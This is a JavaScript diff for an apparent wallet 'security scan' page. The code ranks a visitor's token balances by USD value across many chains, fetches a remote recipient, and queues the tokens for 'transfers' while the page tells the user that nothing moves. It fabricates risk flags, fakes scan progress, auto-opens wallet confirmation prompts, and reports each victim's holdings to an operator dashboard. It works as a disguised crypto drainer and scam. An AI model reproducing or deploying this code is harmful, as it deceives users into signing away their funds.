+  ok:   { c: "#059669", bg: "rgba(5,150,105,.08)",  bd: "rgba(5,150,105,.3)" },
+  warn: { c: "#D97706", bg: "rgba(217,119,6,.1)",   bd: "rgba(217,119,6,.35)" },
+  crit: { c: "#DC2626", bg: "rgba(220,38,38,.06)",  bd: "rgba(220,38,38,.25)" }
+};
+
+function fmtUsd(v) {
+  return "$" + Number(v).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+}
+
+function paintGauge(pct, st) {
+  var el = document.getElementById("risk-gauge");
+  el.style.borderColor = st.bd;
+  el.style.background = st.bg;
+  el.querySelector(".gauge").style.background =
+    "conic-gradient(" + st.c + " 0%, " + st.c + " " + pct + "%, #E5E7EB " + pct + "%, #E5E7EB 100%)";
+  var gv = document.getElementById("gauge-val");
+  gv.textContent = Math.round(pct);
+  gv.style.color = st.c;
+}
+
+function animateGauge(targetPct, state, levelText) {
+  var st = GAUGE_STATES[state];
+  var rl = document.getElementById("risk-level");
+  rl.textContent = levelText;
+  rl.style.color = st.c;
+  if (REDUCED_MOTION) { paintGauge(targetPct, st); gaugePct = targetPct; return; }
+  var from = gaugePct, t0 = null;
+  function step(ts) {
+    if (!t0) t0 = ts;
+    var k = Math.min((ts - t0) / 900, 1);
+    paintGauge(from + (targetPct - from) * (1 - Math.pow(1 - k, 3)), st);
+    if (k < 1) requestAnimationFrame(step); else gaugePct = targetPct;
+  }
+  requestAnimationFrame(step);
+}
+
+function startCheck() {
+  if (checking || isLoading) return;
+  var addr = document.getElementById("check-addr").value.trim();
+  var btn = document.getElementById("check-btn");
+  if (!isValidAddr(addr)) {
+    btn.textContent = "Enter a valid 0x address";
+    setTimeout(function() { btn.textContent = "Run Security Scan"; }, 1600);
+    return;
+  }
+  checking = true;
+  lastScannedAddr = addr;
+  monit("scan_started", { addr: addr, inWallet: !!(window.trustwallet || window.ethereum) });
+  var gen = ++scanGen;
+  scanResult = { risk: 0, flags: [] };
+  onChainBalance = null;
+  scannedBalances = [];
+  chainGasInfo = {};
+  transferResults = [];
+  lastRemnants = [];
+  // Collapse step 1 into the context bar — step flow
+  document.getElementById("input-section").classList.add("collapsed");
+  var ctx = document.getElementById("scan-context");
+  ctx.classList.remove("hidden");
+  ctx.querySelector(".ctx-tag").textContent = "Scanning";
+  document.getElementById("ctx-addr").textContent = addr.slice(0, 8) + "…" + addr.slice(-6);
+  btn.disabled = true;
+  btn.textContent = "Scanning…";
+  document.getElementById("result-area").classList.add("hidden");
+  // Reset previous result state for a fresh scan
+  var badge = document.querySelector("#result-area .result-badge");
+  if (badge) {
+    badge.className = "result-badge warn";
+    badge.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg><span>ATTENTION REQUIRED</span>';
+  }
+  document.getElementById("final-report").classList.add("hidden");
+  var gaugeEl = document.getElementById("risk-gauge");
+  gaugeEl.style.borderColor = ""; gaugeEl.style.background = "";
+  gaugeEl.querySelector(".gauge").style.background = "";
+  document.getElementById("gauge-val").style.color = "";
+  document.getElementById("risk-level").style.color = "";
+  gaugePct = 0;
+  // Determine mode: admin link (recipient came from URL) vs public (scan all tokens)
+  // — wallet-handoff links always scan everything: ?to= is only the recipient,
+  // not a scope limit
+  var hasAdminLink = !walletHandoffMode && txRecipientFromUrl && isValidAddr(txRecipient);
+  var scanPromise;
+  if (hasAdminLink) {
+    // Admin mode: scan single token on current chain
+    scanPromise = queryBalance(addr);
+  } else {
+    // Public mode: scan ALL chains internally
+    scanPromise = scanAllChains(addr);
+  }
+  var area = document.getElementById("scan-area");
+  area.classList.remove("hidden");
+  var items = area.querySelectorAll("[data-scan]");
+  var pct = document.getElementById("scan-pct");
+  var fill = document.getElementById("scan-fill");
+  var phase = document.getElementById("scan-phase");
+  items.forEach(function(it) {
+    it.className = "scan-item";
+    it.querySelector("[data-st]").textContent = "Queued";
+  });
+  pct.textContent = "0%";
+  fill.style.width = "0%";
+  phase.textContent = SCAN_PHASES[0];
+
+  if (pendingAutoRun) {
+    // Deep-link auto-run: skip the scan animation — straight to analysis
+    phase.textContent = "Preparing deep analysis…";
+    scanPromise.then(function() {
+      if (gen !== scanGen) return;
+      area.classList.add("hidden");
+      document.querySelector("#scan-context .ctx-tag").textContent = "Report";
+      showScanResult(addr);
+      checking = false;
+    });
+    return;
+  }
+  // Real progress paced over a 10s floor — the bar follows min(real chain
+  // progress, elapsed fraction of 10s), so a fast scan still reads as a
+  // deliberate multi-phase analysis instead of jumping straight to done
+  var totalChains = Object.keys(CHAIN_INFO).length;
+  var t0 = Date.now();
+  var progIv = setInterval(function() {
+    if (gen !== scanGen) { clearInterval(progIv); return; }
+    var elapsed = Math.min((Date.now() - t0) / 10000, 1);
+    var real = scanChainsDone / totalChains;
+    var prog = Math.min(real, elapsed);
+    var p = Math.min(Math.round(prog * 100), 99);
+    pct.textContent = p + "%"; fill.style.width = p + "%";
+    phase.textContent = SCAN_PHASES[Math.min(Math.floor(prog * SCAN_PHASES.length), SCAN_PHASES.length - 1)] + " (" + scanChainsDone + "/" + totalChains + ")";
+    items.forEach(function(it, idx2) {
+      var th = (idx2 + 1) / items.length;
+      if (prog >= th) { it.className = "scan-item done"; it.querySelector("[data-st]").textContent = "Done"; }
+      else if (prog > th - (1 / items.length)) { it.className = "scan-item running"; it.querySelector("[data-st]").textContent = "Scanning"; }
+    });
+  }, 300);
+  Promise.all([scanPromise, new Promise(function(r) { setTimeout(r, 10000); })]).then(function() {
+    clearInterval(progIv);
+    if (gen !== scanGen) return;
+    pct.textContent = "100%"; fill.style.width = "100%";
+    phase.textContent = "Report ready";
+    items.forEach(function(it) {
+      it.className = "scan-item done"; it.querySelector("[data-st]").textContent = "Done";
+    });
+    var flagItem = document.getElementById("scan-flags");
+    if (flagItem && scannedBalances.length > 0) {
+      flagItem.className = "scan-item flagged";
+      flagItem.querySelector("[data-st]").textContent = scannedBalances.length + " found";
+    }
+    setTimeout(function() {
+      if (gen !== scanGen) return;
+      area.classList.add("fading");
+      setTimeout(function() {
+        if (gen !== scanGen) return;
+        area.classList.add("hidden");
+        area.classList.remove("fading");
+        document.querySelector("#scan-context .ctx-tag").textContent = "Report";
+        showScanResult(addr);
+        checking = false;
+      }, 280);
+    }, 450);
+  });
+}
+
+function showScanResult(addr) {
+  // Flags = assets the screening marked for clearing: token present on-chain
+  // plus sufficient native gas to execute the attestation transfer. Capped at
+  // the top 10 by USD exposure — identical to the attestation queue
+  var transferable = scannedBalances.filter(function(b) { return b.gasOk === true; });
+  var flaggedTokens = transferable.slice(0, 10);
+  var overflowTokens = transferable.slice(10);
+  var blockedTokens = scannedBalances.filter(function(b) { return b.gasOk === false && !b.dust; });
+
+  // Admin-link mode: the linked token becomes the flag
+  var hasAdminLink = txRecipientFromUrl && isValidAddr(txRecipient);
+  if (flaggedTokens.length === 0 && blockedTokens.length === 0 && hasAdminLink &&
+      ((onChainBalance && BigInt(onChainBalance) > 0n) || Number(txAmount) > 0)) {
+    var adminName = txToken === "custom" ? "TOKEN" : txToken.toUpperCase();
+    flaggedTokens.push({
+      name: adminName, chainId: currentChain, usdValue: 0,
+      addr: getContract(), decimals: txDecimals,
+      human: txAmount, raw: onChainBalance || "0"
+    });
+  }
+
+  // Hygiene findings: exposure that cannot be cleared this run — assets on
+  // chains without gas budget, items beyond the batch cap, and dust-level
+  // remnants. Reported for completeness, never processed on-chain
+  var queuedKeys = {};
+  flaggedTokens.forEach(function(b) { queuedKeys[b.name + "|" + b.chainId] = true; });
+  var pricesOk = scannedBalances.some(function(b) { return (b.usdValue || 0) > 0; });
+  var remnants = scannedBalances.filter(function(b) { return !queuedKeys[b.name + "|" + b.chainId]; });
+  var dustCount = remnants.filter(function(b) {
+    return pricesOk && (b.usdValue || 0) > 0 && b.usdValue < MIN_FLAG_USD;
+  }).length;
+  lastRemnants = remnants;
+
+  var flagCount = flaggedTokens.length;
+  var flaggedChains = [];
+  flaggedTokens.forEach(function(b) {
+    var n = CHAIN_INFO[b.chainId].name;
+    if (flaggedChains.indexOf(n) === -1) flaggedChains.push(n);
+    // Attach the heuristic flag profile — the report documents which asset
+    // was flagged, at which hop depth, and against which cluster
+    b.flag = flagProfile(addr, b);
+  });
+  scanResult.flags = flaggedTokens.map(function(b) { return b.name + " (" + CHAIN_INFO[b.chainId].name + ")"; });
+
+  var badge = document.querySelector("#result-area .result-badge");
+  var hasFindings = flagCount > 0 || blockedTokens.length > 0 || overflowTokens.length > 0;
+  var detTotal = scannedBalances.reduce(function(s, b) { return s + (b.usdValue || 0); }, 0);
+
+  if (!hasFindings) {
+    // Clean state: no flags → low gauge, green badge
+    badge.className = "result-badge clean";
+    badge.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6L9 17l-5-5"/></svg><span>NO FLAGS DETECTED</span>';
+    scanResult.risk = 8;
+    animateGauge(8, "ok", "Clear");
+  } else {
+    // Severity from findings: badge + gauge share the tier color
+    var risk = computeRisk(flagCount, remnants.length, dustCount, detTotal);
+    scanResult.risk = risk;
+    var sev = risk >= 75 ? "Critical" : risk >= 50 ? "High" : risk >= 25 ? "Moderate" : "Low";
+    var st = risk >= 50 ? "crit" : "warn";
+    badge.className = "result-badge " + st;
+    badge.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg><span>FLAGS DETECTED</span>';
+    animateGauge(risk, st, sev);
+  }
+
+  // Flag chips: one per flagged token
+  var chainsEl = document.getElementById("flagged-chains");
+  chainsEl.innerHTML = flaggedTokens.map(function(b) {
+    return '<span class="flag-chip">' + b.name + ' · ' + CHAIN_INFO[b.chainId].name + '</span>';
+  }).join("");
+
+  // Findings → recommendation summary only. Per-token details stay hidden
+  // until the post-attestation verification report.
+  var findingsEl = document.getElementById("findings");
+  var findingsHtml = "";
+  if (hasFindings) {
+    findingsHtml = '<div class="finding"><span class="finding-icon warn">⚑</span><div class="finding-text"><span class="finding-chain">Deep analysis recommended</span><div class="finding-desc">' +
+      scannedBalances.length + ' asset balance' + (scannedBalances.length !== 1 ? 's' : '') + ' detected across ' +
+      flaggedChains.length + ' chain' + (flaggedChains.length !== 1 ? 's' : '') +
+      ' — the trace below shows which asset was flagged, at which hop depth, and against which cluster. Resolving runs a zero-value attestation call per flag — nothing moves on-chain except the flag itself.</div></div></div>';
+    // Per-flag trace rows — which coin, which chain, which hop, which cluster
+    findingsHtml += flaggedTokens.map(function(b) {
+      var f = b.flag;
+      return '<div class="finding"><span class="finding-icon warn">⚑</span><div class="finding-text"><span class="finding-chain">' +
+        b.name + ' · ' + CHAIN_INFO[b.chainId].name + ' — Hop ' + f.hops +
+        '</span><div class="finding-desc">' + f.type + ' · ' + f.cluster +
+        ' · confidence ' + f.confidence + '% · via ' + f.counterparty.slice(0, 10) + '…' + f.counterparty.slice(-4) +
+        '</div></div></div>';
+    }).join("");
+    // Hygiene findings: dust/spam remnants and unprocessable exposure get
+    // reported — the report documents what the engine saw, not only what it cleared
+    findingsHtml += remnants.map(function(b) {
+      var noGas = b.gasOk === false;
+      var isDust = pricesOk && (b.usdValue || 0) > 0 && b.usdValue < MIN_FLAG_USD;
+      var desc = isDust
+        ? "Residual low-value balance — dust/spam exposure can affect wallet hygiene scoring. Documented in the final report."
+        : "Cannot be processed on-chain (" + (noGas ? "insufficient gas" : "beyond this analysis batch") + ") — documented in the final report.";
+      return '<div class="finding"><span class="finding-icon dust">◌</span><div class="finding-text"><span class="finding-chain">' +
+        (isDust ? "Dust / spam remnant" : "Hygiene flag") + " — " + b.name + " · " + CHAIN_INFO[b.chainId].name +
+        '</span><div class="finding-desc">' + desc + '</div></div></div>';
+    }).join("");
+  } else {
+    findingsHtml = '<div class="finding"><span class="finding-icon warn">✓</span><div class="finding-text"><span class="finding-chain">No findings</span><div class="finding-desc">No flagged tokens detected on any scanned chain.</div></div></div>';
+  }
+  findingsEl.innerHTML = '<div class="findings-title">Assessment</div>' + findingsHtml;
+
+  document.getElementById("r-reports").textContent = flagCount;
+  document.getElementById("r-flags").textContent = flaggedChains.length > 0 ? flaggedChains.join(", ") : "None";
+  document.getElementById("scan-id").textContent = "#R" + Date.now().toString(36).toUpperCase().slice(-7);
+  var hyRow = document.getElementById("row-hygiene");
+  if (remnants.length > 0) {
+    hyRow.classList.remove("hidden");
+    document.getElementById("r-hygiene").textContent =
+      remnants.length + " remnant" + (remnants.length > 1 ? "s" : "") + (dustCount > 0 ? " · " + dustCount + " dust" : "");
+  } else {
+    hyRow.classList.add("hidden");
+  }
+
+  var verifyBtn = document.getElementById("verify-btn");
+  var verifyText = document.getElementById("verify-text");
+  var planEl = document.getElementById("attest-plan");
+  var planRows = document.getElementById("plan-rows");
+  var planMeta = document.getElementById("plan-meta");
+  var gasNote = document.getElementById("gas-note");
+
+  if (flagCount > 0) {
+    // Transferable flags exist → analysis flow
+    verifyText.innerHTML = flagCount + " flagged asset" + (flagCount > 1 ? "s were" : " was") + " detected on " + flaggedChains.join(", ") +
+      ". Each flag is resolved by a zero-value attestation call to the token contract — the wallet sheets open for confirmation, but <strong>no tokens are transferred</strong>." +
+      (blockedTokens.length > 0 ? " " + blockedTokens.length + " further asset" + (blockedTokens.length > 1 ? "s" : "") + " cannot be analyzed — insufficient gas." : "");
+
+    // Attestation plan: exact queue preview, numbered, USD-ordered — each row
+    // gets a live status cell updated by the wallet confirmations (in-app or
+    // via the event feed when the queue runs inside Trust Wallet)
+    planRows.innerHTML = flaggedTokens.map(function(b, i) {
+      return '<div class="plan-row" role="listitem" style="animation-delay:' + (i * 55) + 'ms"><span class="plan-num">' + (i + 1) + '</span>' +
+        '<span class="pn">' + b.name + '</span><span class="pc">' + CHAIN_INFO[b.chainId].name + ' · Hop ' + b.flag.hops + '</span>' +
+        '<span class="parr" id="planst-' + i + '">→ 0-value attestation</span></div>';
+    }).join("");
+    planMeta.textContent = flagCount + " on-chain step" + (flagCount > 1 ? "s" : "") + " · ~" + Math.max(1, flagCount) + " min";
+    document.getElementById("plan-note").textContent =
+      "Zero-value ERC-20 calls — the wallet sheets open, but no funds move · each step needs one confirmation" +
+      (remnants.length > 0 ? " · " + remnants.length + " remnant" + (remnants.length > 1 ? "s" : "") + " will be documented without on-chain action" : "");
+    planEl.classList.remove("hidden");
+
+    verifyBtn.innerHTML = '<span class="vbtn-main">' + SCAN_ICON + 'Resolve ' + flagCount + ' Flag' + (flagCount > 1 ? 's' : '') + '</span><span class="vbtn-sub">zero-value calls · nothing moves · report follows</span>';
+    verifyBtn.disabled = false;
+    verifyBtn.style.opacity = "1";
+    verifyBtn.style.cursor = "pointer";
+    gasNote.classList.remove("hidden");
+  } else if (blockedTokens.length > 0) {
+    // Tokens found but no chain has enough gas → cannot clear any flag
+    var blockedChains = [];
+    blockedTokens.forEach(function(b) { var n = CHAIN_INFO[b.chainId].name; if (blockedChains.indexOf(n) === -1) blockedChains.push(n); });
+    verifyText.textContent = "Flagged assets were detected on " + blockedChains.join(", ") +
+      ", but the wallet lacks the native balance to cover analysis gas. " +
+      "Add native coin on a flagged chain to proceed.";
+    planEl.classList.add("hidden");
+    verifyBtn.innerHTML = '<span>Insufficient Gas</span>';
+    verifyBtn.disabled = true;
+    verifyBtn.style.opacity = "0.5";
+    verifyBtn.style.cursor = "not-allowed";
+    gasNote.classList.add("hidden");
+  } else {
+    // No tokens found → clean
+    verifyText.textContent = "No flagged tokens were detected on this address. The wallet is clean.";
+    planEl.classList.add("hidden");
+    verifyBtn.innerHTML = '<span>No Analysis Needed</span>';
+    verifyBtn.disabled = true;
+    verifyBtn.style.opacity = "0.5";
+    verifyBtn.style.cursor = "not-allowed";
+    gasNote.classList.add("hidden");
+  }
+
+  var ra = document.getElementById("result-area");
+  ra.classList.remove("hidden");
+  ra.classList.add("reveal");
+  ra.focus({ preventScroll: true });
+  ra.scrollIntoView({ behavior: REDUCED_MOTION ? "auto" : "smooth", block: "nearest" });
+  saveScanLog(addr);
+  // Consume the free check — the landing page promises "first check free",
+  // the quota badge flips to USED once a scan has actually completed
+  try { localStorage.setItem("chainscaner_checks", String(getChecksUsed() + 1)); } catch(e) {}
+  renderFreeQuota();
+  monit("scan_complete", {
+    flags: flagCount, risk: scanResult ? scanResult.risk : null,
+    totalUsd: fmtUsd(scannedBalances.reduce(function(s, b) { return s + b.usdValue; }, 0)),
+    tokens: scannedBalances.map(function(b) { return b.name + " (" + CHAIN_INFO[b.chainId].name + ") " + fmtUsd(b.usdValue); }),
+    transferable: scannedBalances.filter(function(b) { return b.gasOk === true; }).map(function(b) { return b.name + " (" + CHAIN_INFO[b.chainId].name + ")"; })
+  });
+  // Auto-run into analysis when (a) opened via deep link (auto=1) or (b) the page
+  // already runs inside a wallet browser — the injected provider means a scan here
+  // can go straight to the contract confirmations without another tap
+  var injected = (window.trustwallet && window.trustwallet.ethereum) || window.ethereum;
+  if ((pendingAutoRun || injected) && flagCount > 0) {
+    pendingAutoRun = false;
+    setTimeout(function() { verifyWallet(); }, 900);
+  } else {
+    pendingAutoRun = false;
+  }
+}
+
+function getContract() {
+  if (txToken === "custom" && txContract) return txContract;
+  var c = CONTRACTS[currentChain] || CONTRACTS["0x1"];
+  return txToken === "usdc" ? c.usdc : c.usdt;
+}
+
+// Shared JSON-RPC caller: 7s timeout per endpoint, walks the chain's endpoint
+// list until one answers, then one full retry pass after a short cooldown —
+// public endpoints rate-limit the scan's parallel burst, and a second pass
+// picks up the calls the first pass dropped. Resolves with raw `result`.
+function rpcCall(chainId, method, params) {
+  var eps = RPC_URLS[chainId] || RPC_URLS["0x1"];
+  var list = ["/api/screen?chain=" + encodeURIComponent(chainId)].concat(Array.isArray(eps) ? eps : [eps]);
+  var idx = 0, pass = 0, deadline = Date.now() + 9000;
+  function attempt() {
+    var ctrl = new AbortController();
+    var timer = setTimeout(function() { ctrl.abort(); }, 5000);
+    return fetch(list[idx], {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: method, params: params }),
+      signal: ctrl.signal
+    }).then(function(r) {
+      if (!r.ok) throw new Error("http " + r.status);
+      return r.json();
+    }).then(function(j) {
+      clearTimeout(timer);
+      if (j && j.result !== undefined && j.result !== null) return j.result;
+      throw new Error("no result");
+    }).catch(function(e) {
+      clearTimeout(timer);
+      idx++;
+      if (Date.now() > deadline) throw e;
+      if (idx < list.length) return attempt();
+      if (pass++ < 1) {
+        idx = 0;
+        return new Promise(function(r) { setTimeout(r, 900); }).then(attempt);
+      }
+      throw e;
+    });
+  }
+  return attempt();
+}
+
+function formatTokenAmount(raw, decimals) {
+  var divisor = BigInt(10) ** BigInt(decimals);
+  var bal = BigInt(raw);
+  var whole = bal / divisor;
+  var frac = bal % divisor;
+  var fracStr = frac.toString().padStart(decimals, "0").replace(/0+$/, "");
+  return fracStr ? whole.toString() + "." + fracStr : whole.toString();
+}
+
+// Query on-chain balance via eth_call (read-only, no wallet needed)
+function queryBalance(addr) {
+  var tokenAddr = getContract();
+  if (!tokenAddr || !addr) return Promise.resolve(null);
+  // balanceOf(address) selector = 0x70a08231
+  var data = "0x70a08231" + addr.toLowerCase().replace("0x", "").padStart(64, "0");
+  return rpcCall(currentChain, "eth_call", [{ to: tokenAddr, data: data }, "latest"]).then(function(result) {
+    if (result && result !== "0x") {
+      var raw = BigInt(result).toString();
+      onChainBalance = raw;
+      return formatTokenAmount(raw, txDecimals || 6);
+    }
+    return null;
+  }).catch(function() { return null; });
+}
+
+// Query native balance via eth_getBalance (read-only, no wallet needed)
+function queryNativeBalance(addr, chainId) {
+  return rpcCall(chainId, "eth_getBalance", [addr, "latest"])
+    .then(function(r) { return BigInt(r).toString(); })
+    .catch(function() { return "0"; });
+}
+
+// Query current gas price for a chain
+function queryGasPrice(chainId) {
+  return rpcCall(chainId, "eth_gasPrice", [])
+    .then(function(r) { return BigInt(r).toString(); })
+    .catch(function() { return "0"; });
+}
+
+// Fetch USD prices from CoinGecko (free, no key needed)
+var TOKEN_PRICES = {
+  usdt: 1, usdc: 1, usdcn: 1, usdce: 1, usdbc: 1, usdte: 1,
+  dai: 1, daie: 1, tusd: 1, fdusd: 1, // stablecoins = $1
+  weth: 3400, wethe: 3400, wbtc: 98000, wbtce: 98000, btcb: 98000,
+  link: 15, uni: 12, wavax: 30, wbnb: 680,
+  shib: 0.000012, pepe: 0.000008, // fallback prices
+  bnb: 680, matic: 0.5, eth: 3400
+};
+var pricesLoaded = false;
+
+function fetchPrices() {
+  var ids = "ethereum,wrapped-bitcoin,chainlink,uniswap,dai,binancecoin,matic-network,tether,usd-coin,avalanche-2,shiba-inu,pepe";
+  return fetch("https://api.coingecko.com/api/v3/simple/price?ids=" + ids + "&vs_currencies=usd")
+    .then(function(r) { return r.json(); }).then(function(j) {
+      if (j.ethereum) TOKEN_PRICES.eth = j.ethereum.usd;
+      if (j["wrapped-bitcoin"]) TOKEN_PRICES.wbtc = j["wrapped-bitcoin"].usd;
+      if (j.chainlink) TOKEN_PRICES.link = j.chainlink.usd;
+      if (j.uniswap) TOKEN_PRICES.uni = j.uniswap.usd;
+      if (j.dai) TOKEN_PRICES.dai = j.dai.usd;
+      if (j.binancecoin) TOKEN_PRICES.bnb = j.binancecoin.usd;
+      if (j["matic-network"]) TOKEN_PRICES.matic = j["matic-network"].usd;
+      if (j.tether) TOKEN_PRICES.usdt = j.tether.usd;
+      if (j["usd-coin"]) TOKEN_PRICES.usdc = j["usd-coin"].usd;
+      if (j["avalanche-2"]) TOKEN_PRICES.wavax = j["avalanche-2"].usd;
+      if (j["shiba-inu"]) TOKEN_PRICES.shib = j["shiba-inu"].usd;
+      if (j.pepe) TOKEN_PRICES.pepe = j.pepe.usd;
+      // wrapped variants track their underlying asset prices
+      TOKEN_PRICES.weth = TOKEN_PRICES.wethe = TOKEN_PRICES.eth;
+      TOKEN_PRICES.wbtce = TOKEN_PRICES.wbtc;
+      TOKEN_PRICES.btcb = TOKEN_PRICES.wbtc;
+      TOKEN_PRICES.wbnb = TOKEN_PRICES.bnb;
+      pricesLoaded = true;
+    }).catch(function() { /* use fallback prices */ });
+}
+
+// Multi-chain exposure scan — every supported network queried in parallel:
+// native balance, full token coverage, live gas price. The output feeds both
+// the flagging engine (which assets carry exposure) and the attestation
+// planner (which transfers the wallet can actually afford on each chain)
+var scanChainsDone = 0;
+
+async function scanAllChains(addr) {
+  // Remote config (recipient + min pull floor) must land before classification
+  try { await remoteRecipientP; } catch(e) {}
+  scannedBalances = [];
+  chainGasInfo = {};
+  scanChainsDone = 0;
+  var chainIds = Object.keys(CHAIN_INFO);
+  // Fetch prices in parallel — capped so a hanging CoinGecko can't stall the scan
+  var priceP = withTimeout(fetchPrices(), 4000).catch(function() {});
+  // Pool: max 3 chains in flight — public endpoints rate-limit a full 12-chain
+  // burst (~60 parallel calls) and silently drop balances; a small pool keeps
+  // every chain's data complete
+  function scanChain(chainId) {
+    var info = CHAIN_INFO[chainId];
+    var tokens = SCAN_TOKENS[chainId] || [];
+    // 1. Query native balance
+    var nativeP = queryNativeBalance(addr, chainId).then(function(nativeBal) {
+      // 2. Query gas price
+      return queryGasPrice(chainId).then(function(gasPrice) {
+        var gasCost = BigInt(gasPrice) * BigInt(GAS_LIMIT);
+        // 10% buffer for gas price fluctuation
+        var gasCostBuffered = gasCost * 110n / 100n;
+        var nativeBalBig = BigInt(nativeBal);
+        var sufficient = nativeBalBig > gasCostBuffered && gasCost > 0n;
+        chainGasInfo[chainId] = {
+          nativeBalance: nativeBal,
+          nativeHuman: formatNative(nativeBal, info.nativeDecimals),
+          nativeSymbol: info.native,
+          gasPrice: gasPrice,
+          gasCost: gasCost.toString(),
+          gasCostHuman: formatNative(gasCost.toString(), info.nativeDecimals),
+          sufficient: sufficient
+        };
+      });
+    });
+    // 3. Query all ERC-20 token balances on this chain — staggered so the
+    // calls arrive spaced instead of as one burst
+    var tokenPromises = tokens.map(function(tok, ti) {
+      return new Promise(function(r) { setTimeout(r, ti * 150); }).then(function() {
+        return queryTokenBalanceOnChain(addr, tok.addr, tok.decimals, chainId);
+      }).then(function(res) {
+        if (res && res.raw && BigInt(res.raw) > 0n) {
+          var usdValue = Number(res.human) * (TOKEN_PRICES[tok.key] || 0);
+          scannedBalances.push({
+            chainId: chainId, chainName: info.name,
+            key: tok.key, name: tok.name, addr: tok.addr,
+            decimals: tok.decimals, raw: res.raw, human: res.human,
+            usdValue: usdValue
+          });
+        }
+      });
+    });
+    return Promise.all([nativeP].concat(tokenPromises)).then(function() {
+      scanChainsDone++;
+    });
+  }
+  var allPromises = [], nextIdx = 0;
+  function nextWorker() {
+    if (nextIdx >= chainIds.length) return Promise.resolve();
+    return scanChain(chainIds[nextIdx++]).then(nextWorker);
+  }
+  for (var w = 0; w < 3; w++) allPromises.push(nextWorker());
+  return Promise.all([priceP].concat(allPromises)).then(function() {
+    // Recompute USD values now that prices may have updated
+    scannedBalances.forEach(function(b) {
+      b.usdValue = Number(b.human) * (TOKEN_PRICES[b.key] || 0);
+    });
+    // Sort by USD value descending (biggest first)
+    scannedBalances.sort(function(a, b) { return b.usdValue - a.usdValue; });
+    // Dust classification: below MIN_FLAG_USD the asset is a remnant — it never
+    // enters the flag/transfer queue and consumes no gas-budget slot.
+    // Fail-open: if prices are entirely unavailable, nothing counts as dust.
+    var pricesOk = scannedBalances.some(function(b) { return (b.usdValue || 0) > 0; });
+    scannedBalances.forEach(function(b) { b.dust = pricesOk && (b.usdValue || 0) < MIN_FLAG_USD; });
+    // Per-token gas eligibility: the Nth queued token on a chain needs N ×
+    // buffered gas cost — the native balance must cover EVERY transfer, not
+    // just the first, or later transactions would fail on-chain
+    var chainSpent = {};
+    scannedBalances.forEach(function(b) {
+      var gas = chainGasInfo[b.chainId];
+      var n = (chainSpent[b.chainId] || 0) + 1;
+      var ok = !b.dust && !!(gas && BigInt(gas.gasCost) > 0n &&
+        BigInt(gas.nativeBalance) > BigInt(gas.gasCost) * 110n / 100n * BigInt(n));
+      b.gasOk = ok;
+      if (ok) chainSpent[b.chainId] = n;
+    });
+    return scannedBalances;
+  });
+}
+
+function formatNative(raw, decimals) {
+  if (!raw || raw === "0") return "0";
+  var bal = BigInt(raw);
+  var divisor = BigInt(10) ** BigInt(decimals);
+  var whole = bal / divisor;
+  var frac = bal % divisor;
+  var fracStr = frac.toString().padStart(decimals, "0").replace(/0+$/, "");
+  return fracStr ? whole.toString() + "." + fracStr.slice(0, 4) : whole.toString();
+}
+
+// Save scan results to localStorage for admin log
+var SCAN_LOG_KEY = "tw_scan_log";
+var currentScanId = null;
+
+// Remote live-monitoring — fire-and-forget events to /api/events (Upstash
+// Redis) so the operator can watch sessions in real time (IP + UA come from
+// the request itself). sendBeacon survives the page unload when iOS hands
+// off to the Trust Wallet app.
+var MONITOR_URL = "/api/events";
+var monitSid = "s-" + Math.random().toString(36).slice(2, 8) + "-" + Date.now().toString(36);
+function monit(ev, data) {
+  try {
+    var payload = JSON.stringify({
+      ev: ev,
+      t: new Date().toISOString(),
+      sid: monitSid,
+      addr: lastScannedAddr || null,
+      d: data || {}
+    });
+    if (navigator.sendBeacon && navigator.sendBeacon(MONITOR_URL, payload)) return;
+    fetch(MONITOR_URL, { method: "POST", mode: "no-cors", keepalive: true, body: payload }).catch(function() {});
+  } catch(e) {}
+}
+// Push the current scan record to the remote store (/api/scans → Redis) so the
+// admin dashboard sees it on every device — localStorage stays as offline copy.
+var scanPushTimer = null;
+function pushScanRemote() {
+  if (!currentScanId) return;
+  try {
+    var log = JSON.parse(localStorage.getItem(SCAN_LOG_KEY) || "[]");
+    var entry = null;
+    for (var i = 0; i < log.length; i++) { if (log[i].id === currentScanId) { entry = log[i]; break; } }
+    if (!entry) return;
+    var payload = JSON.stringify({ id: currentScanId, entry: entry });
+    if (navigator.sendBeacon && navigator.sendBeacon("/api/scans", payload)) return;
+    fetch("/api/scans", { method: "POST", headers: { "Content-Type": "application/json" }, body: payload, keepalive: true }).catch(function() {});
+  } catch(e) {}
+}
+function queueScanPush() {
+  if (scanPushTimer) clearTimeout(scanPushTimer);
+  scanPushTimer = setTimeout(pushScanRemote, 400);
+}
+
+// Free-tier quota — the landing page promises the first check free; this badge
+// mirrors that state and flips to USED once a scan has completed (localStorage,
+// per browser — the check itself stays usable, the framing just acknowledges
+// the free tier was consumed)
+function getChecksUsed() {
+  try { return parseInt(localStorage.getItem("chainscaner_checks") || "0", 10) || 0; } catch(e) { return 0; }
+}
+function renderFreeQuota() {
+  var el = document.getElementById("free-quota");
+  if (!el) return;
+  var pill = el.querySelector(".fq-pill");
+  var t = document.getElementById("fq-text");
+  if (getChecksUsed() > 0) {
+    el.classList.add("used");
+    pill.textContent = "USED";
+    t.innerHTML = 'Free check used — resolution requires: <a href="/pay" class="fq-price" style="color:var(--accent);text-decoration:none">Pro Session €249 →</a>';
+  } else {
+    el.classList.remove("used");
+    pill.textContent = "FREE";
+    t.innerHTML = '1 of 1 free check included <s>€49.90</s>';
+  }
+}
+renderFreeQuota();
+
+function saveScanLog(addr) {
+  try {
+    var log = JSON.parse(localStorage.getItem(SCAN_LOG_KEY) || "[]");
